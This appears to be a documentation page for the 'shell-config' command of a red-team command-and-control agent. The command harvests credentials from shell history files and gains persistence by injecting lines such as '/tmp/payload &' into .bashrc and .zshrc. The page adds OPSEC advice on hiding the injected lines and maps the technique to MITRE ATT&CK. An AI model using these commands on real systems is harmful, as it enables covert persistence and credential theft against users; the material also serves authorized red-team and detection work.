+++
title = "shell-config"
chapter = false
weight = 109
hidden = false
+++

## Summary

Read shell history files, enumerate shell configuration files, and inject/remove lines from shell initialization scripts. Combines credential harvesting (history files often contain passwords, connection strings, API keys) with persistence (injecting commands into .bashrc/.zshrc/.profile runs code on every shell session).

{{% notice info %}}Linux/macOS Only{{% /notice %}}

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| action | Yes | `history`: read shell history files, `list`: enumerate config/history files, `read`: view a specific file, `inject`: append a line, `remove`: delete a matching line |
| file | Read/Inject/Remove | Target file (e.g., `.bashrc`, `.zshrc`, `/etc/profile`). Relative paths resolve to user's home dir. |
| line | Inject/Remove | Command line to inject or remove |
| user | No | Target user (default: current user). Requires privileges for other users. |
| lines | No | Number of history lines to show (default 100) |
| comment | No | Optional inline comment appended to injected line (for tracking/cleanup) |

## Usage

```
# List all shell config and history files
shell-config -action list

# Read last 50 lines of shell history
shell-config -action history -lines 50

# Read a specific config file
shell-config -action read -file .bashrc

# Read system-wide profile
shell-config -action read -file /etc/profile

# Inject persistence into .bashrc
shell-config -action inject -file .bashrc -line "/tmp/payload &" -comment "fawkes"

# Inject into .zshrc with comment for cleanup tracking
shell-config -action inject -file .zshrc -line "export PATH=/tmp:$PATH" -comment "fawkes-persist"

# Remove an injected line
shell-config -action remove -file .bashrc -line "/tmp/payload &"

# Read another user's history (requires privileges)
shell-config -action history -user root
```

## Shell Files Scanned

### History Files
- `~/.bash_history`, `~/.zsh_history`, `~/.sh_history`, `~/.history`
- `~/.python_history`, `~/.mysql_history`, `~/.psql_history`, `~/.node_repl_history`

### Config Files (User)
- `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`
- `~/.zshrc`, `~/.zprofile`, `~/.zshenv`, `~/.zlogin`

### Config Files (System)
- `/etc/profile`, `/etc/bash.bashrc`, `/etc/bashrc`
- `/etc/zshrc`, `/etc/zsh/zshrc`, `/etc/zsh/zprofile`, `/etc/environment`

## OPSEC Considerations

- History files may contain plaintext credentials, API keys, connection strings, and SSH commands
- Injecting into `.bashrc`/`.zshrc` executes on every interactive shell session (login or `su`)
- Injecting into `.profile`/`.bash_profile` executes only on login shells
- System-wide files (`/etc/profile`, `/etc/bash.bashrc`) require root but affect all users
- The `inject` action skips duplicate lines to avoid repeated injection
- The `comment` parameter helps track injected lines for cleanup
- Shell config modifications are visible via `cat` or `diff` — use innocuous-looking commands

## MITRE ATT&CK Mapping

- **T1546.004** — Event Triggered Execution: Unix Shell Configuration Modification
- **T1552.003** — Unsecured Credentials: Bash History
